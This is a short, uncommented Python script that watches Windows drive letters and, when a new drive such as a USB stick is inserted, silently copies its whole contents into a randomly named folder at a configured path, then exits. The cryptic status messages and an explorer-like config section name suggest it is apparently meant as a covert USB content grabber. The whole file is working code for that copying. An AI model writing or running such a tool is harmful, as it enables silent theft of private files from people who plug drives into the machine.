import os
import os.path
from shutil import copytree
import configparser
import random
import string

config = configparser.ConfigParser()
config.read_file(open(r'conf_runner.txt'))

targInp = config.get('explorer_cfg_567', 'pathDest')

def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))


def diff(list1, list2):
    list_difference = [item for item in list1 if item not in list2]
    return list_difference


def autoRunCopy(src, trg):
    copytree(src, trg)
    print("OK.")
    exit()


dl = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
print("R: " + str(drives))
print("W...")

new_drives = []
while True:
    unchecked_drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
    x = diff(drives, unchecked_drives)
    if x:
        print("UNP: " + str(x))
    x = diff(unchecked_drives, drives)
    if x:
        print("SUCC, C...")
        for new_drive in x:
            if new_drive not in new_drives:
                generated_string = generate_random_string(12)
                new_drives.append(new_drive)
                klasor_yolu = os.path.join(targInp, generated_string)
                src = new_drive + "/"
                autoRunCopy(src, klasor_yolu)
    drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
